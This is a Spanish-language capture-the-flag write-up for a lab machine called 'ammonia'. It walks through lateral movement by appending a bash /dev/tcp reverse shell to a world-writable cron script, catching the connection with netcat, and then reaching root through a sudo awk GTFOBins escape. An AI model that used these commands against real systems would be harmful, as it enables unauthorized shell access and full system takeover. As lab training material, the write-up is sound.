```bash
haber_fritz@ammonia:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *     * * *   clara_immerwahr /opt/scripts/backup_notes.sh
```

Detectamos que el usuario clara_immerwahr ejecuta de forma periódica el script /opt/scripts/backup_notes.sh.
```bash
haber_fritz@ammonia:~$ ls -l /opt/scripts/backup_notes.sh
-rwxrwxrwx 1 root root 288 Jul 15 10:54 /opt/scripts/backup_notes.sh
```
Al verificar los privilegios del script con ls -l, descubrimos que cuenta con permisos de escritura globales (777).

Sabiendo esto, aprovechamos nuestro acceso para inyectar una reverse shell apuntando a nuestra máquina atacante al final del script:

```bash
nc -lvnp 9001 en kali
haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/IP atacante/9001 0>&1" >> /opt/scripts/backup_notes.sh

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.104] from (UNKNOWN) [192.168.1.103] 49488
bash: cannot set terminal process group (1938): Inappropriate ioctl for device
bash: no job control in this shell
clara_immerwahr@ammonia:~$ 
```

## Escalada a Root mediante Sudoers con Awk usando GFTOBins

Ejecución del comando sudo awk 'BEGIN {system("/bin/sh")}' gracias al privilegio NOPASSWD configurado para clara_immerwahr sobre /usr/bin/awk en el archivo sudoers. Esto permite a la usuaria ejecutar awk como root, y al usar la función system() dentro de un bloque BEGIN, se obtiene una shell interactiva con privilegios de superusuario, logrando así la escalada completa a root.

```bash
clara_immerwahr@ammonia:~$ sudo awk 'BEGIN {system("/bin/sh")}'
whoami
root

sudo -l
Matching Defaults entries for root on ammonia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User root may run the following commands on ammonia:
    (ALL : ALL) ALL
```

```bash
[ Atacante (Kali) ]
       │
       ▼ (LFI en WordPress)
[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
       │
       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
       │
       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
[ ROOT ]
```
